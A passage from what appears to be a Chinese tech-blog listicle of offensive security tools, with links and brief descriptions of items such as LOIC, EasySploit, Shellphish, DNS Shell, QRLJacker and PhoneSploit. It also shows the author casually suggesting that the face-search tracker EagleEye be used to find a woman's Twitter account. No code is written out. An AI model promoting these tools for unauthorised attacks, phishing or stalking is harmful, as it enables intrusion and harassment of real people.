data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1596&quot; data-rawheight=&quot;661&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1596&quot; data-original=&quot;https://pic2.zhimg.com/v2-294e6456ca02b2dbfbfa763d0137fcf5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-294e6456ca02b2dbfbfa763d0137fcf5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1596&quot; data-rawheight=&quot;661&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1596&quot; data-original=&quot;https://pic2.zhimg.com/v2-294e6456ca02b2dbfbfa763d0137fcf5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-294e6456ca02b2dbfbfa763d0137fcf5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;特征&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;子域监控&lt;/li&gt;&lt;li&gt;API查询&lt;/li&gt;&lt;li&gt;DNS over TLS 支持&lt;/li&gt;&lt;li&gt;判断域名是否解析&lt;/li&gt;&lt;li&gt;输出为文件等等&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;003 EagleEye&lt;/h2&gt;&lt;blockquote&gt;好友追踪器，使用图像识别和反向图像搜索找到他们的Instagram，FaceBook 和 Twitter 个人资料。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/ThoughtfulDev/EagleEye&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/ThoughtfulDe&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;v/EagleEye&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;至少需要一张好友的照片（要求为 .jpg 文件）及名字 or 昵称。（可使用docker进行一键式安装）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3604c6473273958e50eafb4bf6b614a0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;457&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3604c6473273958e50eafb4bf6b614a0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3604c6473273958e50eafb4bf6b614a0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;457&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-3604c6473273958e50eafb4bf6b614a0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-3604c6473273958e50eafb4bf6b614a0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;通过人像识别进行搜索，还是挺好用的。比如想要某个女生的 Twitter 帐号，直接随便拿一张她的照片和一些姓名或者昵称进去搜索即可。（当然，撞脸怪也挺多的哈~）&lt;/blockquote&gt;&lt;h2&gt;004 ANDRAX v4 DragonFly&lt;/h2&gt;&lt;blockquote&gt;Android 上的渗透测试平台。&lt;/blockquote&gt;&lt;p&gt;官方网站：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//andrax.thecrackertechnology.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;andrax.thecrackertechnology.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7d252d21ca636a4b968be49a7845c2d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;2506&quot; data-rawheight=&quot;1062&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2506&quot; data-original=&quot;https://pic3.zhimg.com/v2-7d252d21ca636a4b968be49a7845c2d2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7d252d21ca636a4b968be49a7845c2d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;2506&quot; data-rawheight=&quot;1062&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2506&quot; data-original=&quot;https://pic3.zhimg.com/v2-7d252d21ca636a4b968be49a7845c2d2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7d252d21ca636a4b968be49a7845c2d2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;特点&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;支持 Android5.0+，随身携带&lt;/li&gt;&lt;li&gt;开源&lt;/li&gt;&lt;li&gt;900+工具&lt;/li&gt;&lt;li&gt;1000+攻击类型&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a6864b7487336d8e8d6c3734b069c4fb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;360&quot; data-rawheight=&quot;640&quot; class=&quot;content_image&quot; width=&quot;360&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a6864b7487336d8e8d6c3734b069c4fb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;360&quot; data-rawheight=&quot;640&quot; class=&quot;content_image lazy&quot; width=&quot;360&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a6864b7487336d8e8d6c3734b069c4fb_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;体验《看门狗》里划划手机就能进行黑客攻击，心动不如行动。&lt;/blockquote&gt;&lt;h2&gt;005 CQTools&lt;/h2&gt;&lt;blockquote&gt;最新的 Windows 黑客工具包。&lt;/blockquote&gt;&lt;p&gt;文档：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cqureacademy.com/blog/black-hat-asia-2019-tools&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;cqureacademy.com/blog/b&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lack-hat-asia-2019-tools&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;从嗅探和欺骗活动开始，通过信息搜集、密码提取、自定义外壳程序生成、自定义有效载荷生成、防病毒解决方案、隐藏代码，各种键盘记录程序等等，该工具包可以在基础架构内进行全面的攻击，并利用这些信息进行再攻击。其中一些工具是 CQURE 团队首次向世界公开发布的。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-af24bc9c14d7b21a7943c47734bd6842_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-af24bc9c14d7b21a7943c47734bd6842_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-af24bc9c14d7b21a7943c47734bd6842_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-af24bc9c14d7b21a7943c47734bd6842_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-af24bc9c14d7b21a7943c47734bd6842_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;006 Sampler&lt;/h2&gt;&lt;blockquote&gt;用于 Shell 命令执行，可视化和警报的工具（使用简单的 YAML 文件配置）。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/sqshq/sampler&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/sqshq/sample&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//sampler.dev/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;sampler.dev/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;323&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;323&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5cac7df91b53b0517539672214f06b30_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;用途：可以从终端直接采样任何动态过程，观察数据库中的更改，监视 MQ 实时消息，触发部署脚本并在完成时获取通知。&lt;/p&gt;&lt;p&gt;如果可以使用 Shell 命令，则可以使用 Sampler 暂时将其可视化。&lt;/p&gt;&lt;h2&gt;007 LOIC 1.0.8&lt;/h2&gt;&lt;blockquote&gt;网络压力测试器。&lt;/blockquote&gt;&lt;p&gt;地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//sourceforge.net/projects/loic/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;sourceforge.net/project&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;s/loic/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;LOIC 通过向服务器发送 TCP 或 UDP 数据包，以破坏特定主机的服务，在目标站点上执行拒绝服务（DoS）攻击（或由多个人使用的DDoS攻击）。很多人自愿使用 LOIC 来加入僵尸网络。&lt;/p&gt;&lt;p&gt;该软件激发了创建名为 JS LOIC 的独立 JavaScript 版本以及基于 LOIC 的 Web 版本 Low Lowbit Web Cannon 的灵感，可从 Web 浏览器启用 DoS，从而进行压力测试。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3a1866da203d3ac48b96406ba85ea36d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;524&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;998&quot; data-original=&quot;https://pic2.zhimg.com/v2-3a1866da203d3ac48b96406ba85ea36d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3a1866da203d3ac48b96406ba85ea36d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;524&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;998&quot; data-original=&quot;https://pic2.zhimg.com/v2-3a1866da203d3ac48b96406ba85ea36d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3a1866da203d3ac48b96406ba85ea36d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;008 EasySploit&lt;/h2&gt;&lt;blockquote&gt;Metasploit自动化（比以往更快捷）。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/KALILINUXTRICKSYT/easysploit&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/KALILINUXTRI&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;CKSYT/easysploit&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;选项&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Windows&lt;/li&gt;&lt;li&gt;Android&lt;/li&gt;&lt;li&gt;Linux&lt;/li&gt;&lt;li&gt;MacOS&lt;/li&gt;&lt;li&gt;Web&lt;/li&gt;&lt;li&gt;扫描目标是否易受 ms17_010 的攻击&lt;/li&gt;&lt;li&gt;仅通过 IP（ms17_010_eternalblue）利用 Windows 7/2008 x64 启用远程桌面（ms17_010_eternalblue）&lt;/li&gt;&lt;li&gt;仅通过 IP（ms17_010_psexec）利用 Windows Vista / XP / 2000/2003 启用远程桌面（ms17_010_psexec）&lt;/li&gt;&lt;li&gt;利用链接利用 Windows（HTA服务器）&lt;/li&gt;&lt;li&gt;联系&lt;/li&gt;&lt;/ol&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ad3208b0d5fef5933b955de7b97f63e7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-ad3208b0d5fef5933b955de7b97f63e7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ad3208b0d5fef5933b955de7b97f63e7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-ad3208b0d5fef5933b955de7b97f63e7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-ad3208b0d5fef5933b955de7b97f63e7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;009 SQLMap&lt;/h2&gt;&lt;blockquote&gt;自动 SQL 注入和数据库接管工具。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/sqlmapproject/sqlmap&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/sqlmapprojec&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;t/sqlmap&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;这个就不过多介绍了，老熟人。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-89759169d5f06cb79ef5907e389c7102_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;757&quot; data-rawheight=&quot;468&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;757&quot; data-original=&quot;https://pic3.zhimg.com/v2-89759169d5f06cb79ef5907e389c7102_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-89759169d5f06cb79ef5907e389c7102_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;757&quot; data-rawheight=&quot;468&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;757&quot; data-original=&quot;https://pic3.zhimg.com/v2-89759169d5f06cb79ef5907e389c7102_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-89759169d5f06cb79ef5907e389c7102_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;010 ScanQLi&lt;/h2&gt;&lt;blockquote&gt;ScanQLi 是一个简单的 SQL 注入扫描程序，具有一些附加功能。该工具无法利用 SQLi，只能检测到它们。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/bambish/ScanQLi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/bambish/Scan&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;QLi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-84bba39a839e9943a29e7ef0759bc467_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;176&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-84bba39a839e9943a29e7ef0759bc467_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-84bba39a839e9943a29e7ef0759bc467_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;176&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/v2-84bba39a839e9943a29e7ef0759bc467_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-84bba39a839e9943a29e7ef0759bc467_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;011 OKadminFinder&lt;/h2&gt;&lt;blockquote&gt;简而言之，后台扫描器。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/mIcHyAmRaNe/okadminfinder3&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/mIcHyAmRaNe/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;okadminfinder3&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a0b6c8438f970a8c6f013231a40b971c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1147&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1147&quot; data-original=&quot;https://pic1.zhimg.com/v2-a0b6c8438f970a8c6f013231a40b971c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a0b6c8438f970a8c6f013231a40b971c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1147&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1147&quot; data-original=&quot;https://pic1.zhimg.com/v2-a0b6c8438f970a8c6f013231a40b971c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-a0b6c8438f970a8c6f013231a40b971c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;优势&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;丰富字典&lt;/li&gt;&lt;li&gt;代理&lt;/li&gt;&lt;li&gt;自更新&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;012 Shellphish&lt;/h2&gt;&lt;blockquote&gt;18 种社交媒体的网络钓鱼工具（Instagram，Facebook，Snapchat，Github，Twitter，Yahoo，Protonmail，Spotify，Netflix，Linkedin，Wordpress，Origin，Steam，Microsoft，InstaFollowers，Gitlab，Pinterest）&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/thelinuxchoice/shellphish&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/thelinuxchoi&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ce/shellphish&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5ca42eb2111919cdcff2110605d089c4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;611&quot; data-original=&quot;https://pic1.zhimg.com/v2-5ca42eb2111919cdcff2110605d089c4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5ca42eb2111919cdcff2110605d089c4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;611&quot; data-original=&quot;https://pic1.zhimg.com/v2-5ca42eb2111919cdcff2110605d089c4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5ca42eb2111919cdcff2110605d089c4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;顾名思义，点到为止。&lt;/p&gt;&lt;h2&gt;013 DNS Shell&lt;/h2&gt;&lt;blockquote&gt;DNS通道上的交互式 Shell&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;什么是DNS Shell&lt;/b&gt;&lt;/p&gt;&lt;p&gt;有效负载是在调用服务器脚本时生成的，它仅利用 nslookup 来执行查询并向服务器查询新命令，然后服务器在端口 53 上侦听传入的通信，一旦在目标计算机上执行了有效负载，服务器就会生成一个交互式外壳。&lt;/p&gt;&lt;p&gt;建立通道后，如果输入了新命令，则有效负载将连续向服务器查询命令，它将执行该命令并将结果返回给服务器。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1594122e46c8b78f9a1a1880e65bbcbd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;448&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-1594122e46c8b78f9a1a1880e65bbcbd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1594122e46c8b78f9a1a1880e65bbcbd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;448&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-1594122e46c8b78f9a1a1880e65bbcbd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-1594122e46c8b78f9a1a1880e65bbcbd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;014 QRLJacker v2.0&lt;/h2&gt;&lt;blockquote&gt;一种新的社会工程学攻击面。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/OWASP/QRLJacking&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/OWASP/QRLJac&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;king&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;QRLJacking 攻击流程&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;攻击者初始化客户端 QR 会话，然后将登录 QR 代码克隆到网络钓鱼网站中：“现在，精心制作的网络钓鱼页面具有有效且定期更新的 QR 代码，可以发送给受害者。”&lt;/li&gt;&lt;li&gt;攻击者将网络钓鱼页面发送给受害者。&lt;/li&gt;&lt;li&gt;受害者使用特定的目标移动应用程序扫描 QR 码。&lt;/li&gt;&lt;li&gt;攻击者获得对受害者帐户的控制权。&lt;/li&gt;&lt;li&gt;该服务正在与攻击者的会话交换所有受害者的数据。&lt;/li&gt;&lt;/ol&gt;&lt;blockquote&gt;QR 码是二维条码的一种。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-605226912b60401093d69df6252b1abe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;350&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-605226912b60401093d69df6252b1abe_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-605226912b60401093d69df6252b1abe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;350&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-605226912b60401093d69df6252b1abe_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-605226912b60401093d69df6252b1abe_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;015 PhoneSploit&lt;/h2&gt;&lt;blockquote&gt;通过使用开放的 Adb 端口利用 Andriod 设备。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/metachar/PhoneSploit&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/metachar/Pho&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;neSploit&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;功能&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;端口转发&lt;/li&gt;&lt;li&gt;抓取wpa_supplicant&lt;/li&gt;&lt;li&gt;打开/关闭WiFi&lt;/li&gt;&lt;li&gt;删除密码&lt;/li&gt;&lt;li&gt;从应用程序提取apk&lt;/li&gt;&lt;li&gt;获取电池状态&lt;/li&gt;&lt;li&gt;获取当前活动等等&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4033e0d126cede5649b497fe1c9d52ad_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; 